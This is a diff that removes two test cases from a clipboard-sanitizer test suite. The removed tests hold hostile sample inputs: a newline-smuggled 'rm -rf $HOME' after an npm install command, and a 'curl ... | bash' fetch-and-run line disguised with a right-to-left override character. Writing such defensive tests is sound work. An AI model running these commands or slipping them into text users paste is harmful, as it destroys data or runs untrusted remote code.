@@ -44,21 +44,6 @@ describe("sanitizeForClipboard", () => {
     expect(sanitizeForClipboard("a﻿b")).toBe("ab");
   });
 
-  it("neutralises the canonical paste-jacking payload", () => {
-    // Displayed-as: `npm install foo` but smuggles a destructive line via LF.
-    const malicious = "npm install foo\nrm -rf $HOME";
-    expect(sanitizeForClipboard(malicious)).toBe("npm install foorm -rf $HOME");
-    expect(sanitizeForClipboard(malicious).includes("\n")).toBe(false);
-  });
-
-  it("neutralises the RIGHT-TO-LEFT OVERRIDE display-spoofing attack", () => {
-    // U+202E reverses display order: visible `hsab/lrucrm.sh` while clipboard
-    // holds `hs/lcurl.bash sm` — strip it so what you see is what you paste.
-    const spoofed = "curl https://x.com/install.sh ‮ | bash";
-    const cleaned = sanitizeForClipboard(spoofed);
-    expect(cleaned.includes("‮")).toBe(false);
-  });
-
   it("handles empty strings", () => {
     expect(sanitizeForClipboard("")).toBe("");
   });
